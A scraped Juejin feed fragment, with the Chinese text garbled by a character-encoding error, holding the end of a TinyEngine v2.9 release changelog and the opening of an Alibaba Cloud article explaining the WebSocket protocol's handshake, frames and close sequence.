<li>ä¿®å¤ImportMapé—®é¢˜å’Œæ”¹è¿›å˜é‡ç»‘å®š byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbetterdancing" target="_blank" title="https://github.com/betterdancing" ref="nofollow noopener noreferrer">@betterdancing</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1676" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1676" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1676</a></li>
<li>é¢„è§ˆæ”¯æŒè‡ªå®šä¹‰import-map byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1669" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1669" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1669</a></li>
<li>ä¿®å¤åˆå§‹åŒ–æœŸé—´æ–¹æ³•é«˜äº®å¤±è´¥ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1666" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1666" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1666</a></li>
<li>ä¿®å¤parseFunctionç©ºå­—ç¬¦ä¸²å¤„ç†é—®é¢˜ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffayching" target="_blank" title="https://github.com/fayching" ref="nofollow noopener noreferrer">@fayching</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1677" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1677" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1677</a></li>
<li>æ›´æ–°ç”Ÿæˆä»£ç æ¨¡æ¿ä¾èµ–ç‰ˆæœ¬ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1620" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1620" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1620</a></li>
<li>åˆ é™¤webcomponentåŒ… byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1583" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1583" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1583</a></li>
<li>å¯¼å‡ºåŸºç¡€ç±»å‹ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1692" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1692" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1692</a></li>
<li>æ–‡æ¡£æ›´æ–°
<ul>
<li>æ·»åŠ å‰åç«¯Dockeréƒ¨ç½²æ–‡æ¡£ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flu-yg" target="_blank" title="https://github.com/lu-yg" ref="nofollow noopener noreferrer">@lu-yg</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1598" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1598" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1598</a></li>
<li>æ›´æ–°æ³¨å†Œè¡¨ä»£ç ç¤ºä¾‹ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchilingling" target="_blank" title="https://github.com/chilingling" ref="nofollow noopener noreferrer">@chilingling</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1693" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1693" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1693</a></li>
<li>æ›´æ–°AIæ’ä»¶æ–‡æ¡£å†…å®¹ byÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhexqi" target="_blank" title="https://github.com/hexqi" ref="nofollow noopener noreferrer">@hexqi</a>Â inÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Fpull%2F1712" target="_blank" title="https://github.com/opentiny/tiny-engine/pull/1712" ref="nofollow noopener noreferrer">opentiny/tiny-engine#1712</a>
Â </li>
</ul>
</li>
</ul>
<p>ä»¥ä¸Šæ˜¯æ­¤æ¬¡æ›´æ–°çš„ä¸»è¦å†…å®¹</p>
<p>å¦‚éœ€äº†è§£æ›´å¤šå¯ä»¥æŸ¥çœ‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine%2Freleases%2Ftag%2Fv2.9.0" title="https://github.com/opentiny/tiny-engine/releases/tag/v2.9.0" target="_blank" ref="nofollow noopener noreferrer">v2.9.0 æ‰€æœ‰ changelog</a></p>
<h2 data-id="heading-17">ç»“è¯­</h2>
<p>TinyEngine v2.9 çš„å‘å¸ƒï¼Œä¸ä»…æ˜¯åŠŸèƒ½å±‚é¢çš„ä¸€æ¬¡å…¨é¢è·ƒè¿â€”â€”ä» AI åŠ©æ‰‹çš„èƒ½åŠ›å¢å¼ºã€Tailwind CSS çš„åŸç”Ÿæ”¯æŒï¼Œåˆ°èµ„æºç®¡ç†æ’ä»¶çš„å¼•å…¥ã€åº”ç”¨é¢„è§ˆèƒ½åŠ›çš„è½åœ°â€”â€”æ›´æ˜¯æˆ‘ä»¬å¯¹â€œæè‡´å¯å®šåˆ¶â€ç†å¿µçš„åˆä¸€æ¬¡æ·±åŒ–å®è·µã€‚æ¯ä¸€ä¸ªç»†èŠ‚çš„æ‰“ç£¨ï¼Œæ¯ä¸€æ¬¡æ¶æ„çš„æ¼”è¿›ï¼Œéƒ½æ—¨åœ¨è®©å¼€å‘è€…ä»¥æ›´ä½çš„æˆæœ¬ã€æ›´é«˜çš„è‡ªç”±åº¦ï¼Œæ„å»ºçœŸæ­£å±äºè‡ªå·±çš„ä½ä»£ç ä¸–ç•Œã€‚</p>
<p>è¿™ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç‰ˆæœ¬çš„æ›´æ–°ï¼Œæ›´æ˜¯ç¤¾åŒºå…±å»ºæˆå°±çš„è§è¯ã€‚æˆ‘ä»¬ç›¸ä¿¡ï¼Œå¼€æºçš„æ„ä¹‰ä¸ä»…åœ¨äºä»£ç å…±äº«ï¼Œæ›´åœ¨äºæ€æƒ³ç¢°æ’ä¸åä½œå…±åˆ›ã€‚æ­£æ˜¯æ¯ä¸€ä½ç”¨æˆ·çš„ä½¿ç”¨ã€åé¦ˆä¸è´¡çŒ®ï¼Œè®© TinyEngine åœ¨çœŸå®åœºæ™¯ä¸­ä¸æ–­æ·¬ç‚¼æˆé•¿ã€‚</p>
<p>æœªæ¥ä¹‹è·¯ï¼Œæˆ‘ä»¬ç»§ç»­åŒè¡Œã€‚
æ¬¢è¿ä½ æŒç»­å…³æ³¨ TinyEngine çš„æ¼”è¿›ï¼Œå‚ä¸ç¤¾åŒºè®¨è®ºï¼Œæäº¤ä½ çš„æƒ³æ³•ä¸ä»£ç ã€‚è®©æˆ‘ä»¬æºæ‰‹ï¼ŒæŠŠä½ä»£ç çš„å¯èƒ½æ€§æ¨å‘æ›´è¿œçš„åœ°æ–¹ã€‚</p>
<h2 data-id="heading-18">å…³äºOpenTiny</h2>
<p>æ¬¢è¿åŠ å…¥ OpenTiny å¼€æºç¤¾åŒºã€‚æ·»åŠ å¾®ä¿¡å°åŠ©æ‰‹ï¼šopentiny-official ä¸€èµ·å‚ä¸äº¤æµå‰ç«¯æŠ€æœ¯ï½</p>
<p>OpenTiny å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.design" target="_blank" title="https://opentiny.design" ref="nofollow noopener noreferrer">opentiny.design</a><br/>
OpenTiny ä»£ç ä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny" target="_blank" title="https://github.com/opentiny" ref="nofollow noopener noreferrer">github.com/opentiny</a><br/>
TinyVue æºç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue" target="_blank" title="https://github.com/opentiny/tiny-vue" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a><br/>
TinyEngine æºç ï¼šâ€…<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine" target="_blank" title="https://github.com/opentiny/tiny-engine" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a><br/>
æ¬¢è¿è¿›å…¥ä»£ç ä»“åº“ StarğŸŒŸTinyEngineã€TinyVueã€TinyNGã€TinyCLIã€TinyEditor~
å¦‚æœä½ ä¹Ÿæƒ³è¦å…±å»ºï¼Œå¯ä»¥è¿›å…¥ä»£ç ä»“åº“ï¼Œæ‰¾åˆ° good first issue æ ‡ç­¾ï¼Œä¸€èµ·å‚ä¸å¼€æºè´¡çŒ®~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡å¸¦ä½ ç©è½¬ WebSocket å…¨é“¾è·¯å¯è§‚æµ‹]]></title>    <link>https://juejin.cn/post/7583898823920418858</link>    <guid>https://juejin.cn/post/7583898823920418858</guid>    <pubDate>2025-12-15T09:14:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583898823920418858" data-draft-id="7583845695196577846" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡å¸¦ä½ ç©è½¬ WebSocket å…¨é“¾è·¯å¯è§‚æµ‹"/> <meta itemprop="keywords" content="äº‘åŸç”Ÿ"/> <meta itemprop="datePublished" content="2025-12-15T09:14:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡å¸¦ä½ ç©è½¬ WebSocket å…¨é“¾è·¯å¯è§‚æµ‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:14:16.000Z" title="Mon Dec 15 2025 09:14:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»24åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šå¼ é“­è¾‰ï¼ˆå¸Œé“­ï¼‰</p>
<h2 data-id="heading-0">å‰è¨€ï¼šWebSocket çš„æŠ€æœ¯æ¼”è¿›ä¸æ—¶ä»£ä»·å€¼</h2>
<h3 data-id="heading-1">1.1 ä»€ä¹ˆæ˜¯ WebSocketï¼Ÿ</h3>
<p>WebSocket æ˜¯ä¸€ç§åŸºäº TCP åè®®çš„å…¨åŒå·¥é€šä¿¡åè®®ï¼ˆRFC 6455 <strong>[</strong> <strong>1]</strong> ï¼‰ï¼Œé€šè¿‡ä¸€æ¬¡ HTTP æ¡æ‰‹å³å¯å»ºç«‹æŒä¹…åŒ–è¿æ¥ï¼Œå®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„åŒå‘æ•°æ®ä¼ è¾“ã€‚ä»¥ä¸‹æ˜¯ä¸€æ¬¡ WebSocket é€šä¿¡çš„ç¤ºæ„å›¾ <strong>[</strong> <strong>2]</strong> ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76c38de6ef7a4bccb8a4e8ba14927b81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=8rxa69Hb%2B16TwcJCDMZ3NojUW%2BU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå’Œ HTTP ä¸åŒï¼ŒClient ä¼šå…ˆå‘ Server ç«¯åŸºäº HTTP åè®®å‘èµ·ä¸€æ¬¡æ¡æ‰‹è¯·æ±‚ï¼ŒServer è¿”å›å“åº”æ¡æ‰‹æˆåŠŸã€‚åœ¨è¿™ä¹‹åï¼Œå·²æœ‰çš„ TCP è¿æ¥ä¼šè¢«å‡çº§ä¸º WebSocket è¿æ¥ï¼ŒClient å’Œ Server ä¹‹é—´å¯ä»¥è¿›è¡Œå…¨åŒå·¥é€šä¿¡ã€‚TCP è¿æ¥ä¼šä¸€ç›´æŒç»­åˆ°å…¶ä¸­ä¸€ä¾§è®¤ä¸ºéœ€è¦å…³é—­ï¼Œä¸”å¯¹æ–¹åŒæ„å…³é—­ä¹‹æ—¶ã€‚</p>
<p>ä¸ºäº†æ›´å¥½ç†è§£åç»­ WebSocket çš„å…¨é“¾è·¯å¯è§‚æµ‹æ–¹æ¡ˆï¼Œæœ‰å¿…è¦å¯¹ WebSocket çš„åè®®ç»†èŠ‚è¿›è¡Œè§£è¯»ï¼Œæœ¬èŠ‚å‰©ä½™å†…å®¹éƒ¨åˆ†ç¿»è¯‘ + æ€»ç»“è‡ª WebSocket Protocol <strong>[</strong> <strong>3]</strong> ã€‚</p>
<h4 data-id="heading-2">1.1.1 URI æ ¼å¼ä¸è¯­æ³•</h4>
<p>å’Œ HTTP åè®®æ—éå¸¸ç±»ä¼¼ï¼ŒWebSocket ä¹Ÿæœ‰æ™®é€šåè®®å’Œä»–çš„å®‰å…¨ç‰ˆæœ¬ï¼Œç”¨ ws å’Œ wss æ¥åŒºåˆ†ï¼Œwss çš„å®‰å…¨ä¹Ÿé‡‡ç”¨ TLS åè®®å®ç°ã€‚ç”±äº WebSocket ä¾èµ– HTTP åè®®è¿›è¡Œæ¡æ‰‹ï¼Œåç»­å¤ç”¨åŸ TCP è¿æ¥ï¼Œæ•… WebSocket é»˜è®¤çš„ç«¯å£ä¹Ÿæ˜¯ 80ï¼ˆwsï¼‰å’Œ 443ï¼ˆwssï¼‰ã€‚URI æ•´ä½“çš„æ ¼å¼ä¹Ÿå’Œ HTTP éå¸¸ç±»ä¼¼ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bfc5d72902bb4d3a880b3a5b5c5be124~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=E8veoaNdC5JWPQ17NtDAl6JUFd4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-3">1.1.2 å¯åŠ¨è¿æ¥æ¡æ‰‹ï¼ˆåŸºäº HTTP/1.1ï¼‰</h4>
<p>ä¼ ç»Ÿçš„ WebSocket æ¡æ‰‹æ˜¯ä¸€æ¬¡å…¸å‹çš„ HTTP è¯·æ±‚/å“åº”ã€‚å®¢æˆ·ç«¯ä¸»åŠ¨å‘èµ·ä¸€ä¸ª WebSocket æ¡æ‰‹è¯·æ±‚ï¼ˆä¸€ä¸ªç‰¹æ®Šçš„ GETï¼‰ï¼Œå¦‚æœæœåŠ¡å™¨æ”¯æŒä¸”å…è®¸ä½¿ç”¨ WebSocket åè®®é€šä¿¡ï¼Œåˆ™ä¼šè¿”å›ä¸€ä¸ª WebSocket æ¡æ‰‹å“åº”ã€‚WebSocket Connection å°±å»ºç«‹èµ·æ¥äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/828f98b33c1644ea84b9869e88576811~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=UOfbY8VUXuXTd7Sg4Y6VAcr%2FkCs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¡æ‰‹è¯·æ±‚åŒ…å«ä»¥ä¸‹å¤´ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4775de1446c4d339cdfae679ac6f5e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=OUfNON19IAxtnLG8tQNPjJnKBDA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¦‚æœæœåŠ¡ç«¯æ¥å— WebSocket åè®®ï¼Œåˆ™å‘é€ä¸€ä¸ª StatusCode ä¸º 101 çš„å“åº”ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile">HTTP/1.1Â 101Â Switching Protocols
<span class="hljs-section">Upgrade: websocket</span>
<span class="hljs-section">Connection: Upgrade</span>
<span class="hljs-section">Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</span>
</code></pre>
<p>å“åº”åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>HTTP/1.1 101 Switching Protocols</code>ï¼šè¡¨ç¤ºæˆåŠŸä» HTTP å‡çº§åˆ° WebSocketã€‚</li>
<li><code>Upgrade: websocket</code>ï¼šç¡®è®¤åè®®å‡çº§ã€‚</li>
<li><code>Connection: Upgrade</code>ï¼šè¡¨ç¤ºè¿æ¥å·²å‡çº§ã€‚</li>
<li><code>Sec-WebSocket-Accept</code>ï¼šä¸€ä¸ªæ ¹æ®å®¢æˆ·ç«¯çš„Â <code>Sec-WebSocket-Key</code>Â è®¡ç®—å‡ºçš„å€¼ï¼Œç”¨äºéªŒè¯æœåŠ¡å™¨ç†è§£äº† WebSocket æ¡æ‰‹è¯·æ±‚ã€‚</li>
</ul>
<p>HTTP/2 ä¸ HTTP/3 å‡çº§åˆ° WebSocket çš„è¿‡ç¨‹æœ‰ä¸€äº›ä¸åŒï¼Œä½†ä¸æ˜¯æœ¬æ–‡è®¨è®ºçš„å…³é”®ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°ï¼Œæ¬¢è¿é˜…è¯» WebSocket ProtocolÂ åŸæ–‡ <strong>[</strong> <strong>3]</strong> ã€‚</p>
<h4 data-id="heading-4">1.1.3 WebSocket æ¶ˆæ¯ä¸æ•°æ®å¸§</h4>
<p>åœ¨æ¡æ‰‹å®Œæ¯•åï¼Œè¿æ¥ä¼šè¢«å‡çº§ä¸º WebSocket è¿æ¥ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å¯ä»¥éšæ—¶åŒå‘å‘é€ WebSocket æ¶ˆæ¯ï¼ˆmessageï¼‰ï¼Œç”¨æ¥äº¤æ¢æ•°æ®å’ŒæŒ‡ä»¤ã€‚WebSocket ä¸­çš„æœ€å°é€šä¿¡å•å…ƒæ˜¯æ•°æ®å¸§ï¼Œæ¯ä¸ªæ¶ˆæ¯æœ‰å¯èƒ½ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ•°æ®å¸§ç»„æˆã€‚</p>
<p>æ•°æ®å¸§æ ¹æ®å…¶ç”¨é€”å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š</p>
<ul>
<li><strong>æ–‡æœ¬å¸§ï¼š</strong> è½½è·ä¸º UTF-8 ç¼–ç çš„æ–‡æœ¬æ•°æ®</li>
<li><strong>äºŒè¿›åˆ¶å¸§ï¼š</strong> è½½è·ä¸ºäºŒè¿›åˆ¶æ•°æ®</li>
<li><strong>æ§åˆ¶å¸§ï¼š</strong> ç”¨äºä¼ é€’åè®®ä¿¡å·ï¼Œå¦‚ pingã€pongã€close å¸§ç­‰</li>
</ul>
<p>ä¸€ä¸ªæ•°æ®å¸§çš„æ•°æ®ç»„æˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/961fdeb250e4437d816cca34abde8e6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=5wIgf%2FLtTgQxWjg6cHOKA%2FUAYQ8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å…³äºæ•°æ®å¸§ä¸­æ¯æ®µæ•°æ®çš„å«ä¹‰ï¼Œå¦‚æœ‰å…´è¶£ï¼Œæ¬¢è¿é˜…è¯»Â WebSocket ProtocolÂ åŸæ–‡Â  <strong>[</strong> <strong>3]</strong> ã€‚</p>
<h4 data-id="heading-5">1.1.4 å…³é—­è¿æ¥æ¡æ‰‹</h4>
<p>å½“å®¢æˆ·ç«¯æˆ–æœåŠ¡ç«¯æŸä¸€æ–¹è®¤ä¸ºè¿æ¥å¯ä»¥å…³é—­æ—¶ï¼Œä¼šå‘å¯¹ç«¯å‘é€ä¸€ä¸ªå…³é—­å¸§ï¼ˆæ˜¯æ§åˆ¶å¸§çš„ä¸€ç§ï¼‰ï¼Œå¯¹ç«¯æ”¶åˆ°å…³é—­å¸§åä¼šå°½å¿«å‘é€å¦ä¸€ä¸ªå…³é—­å¸§ä½œä¸ºå“åº”ã€‚å‘é€å®Œå…³é—­å¸§åï¼Œè¯¥ç«¯ä¸åº”è¯¥å†å‘é€ä»»ä½•æ•°æ®å¸§ã€‚åŒæ–¹äº¤æ¢å®Œå…³é—­å¸§åï¼ŒTCP è¿æ¥å°†å…³é—­ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ce443f1cb0b4b96827dacf032be2a1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=7jwOUM10oRrnC7OHhCF5%2BAsOMlc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-6">1.2 ä¸ºä»€ä¹ˆç”¨ WebSocketï¼Ÿ</h3>
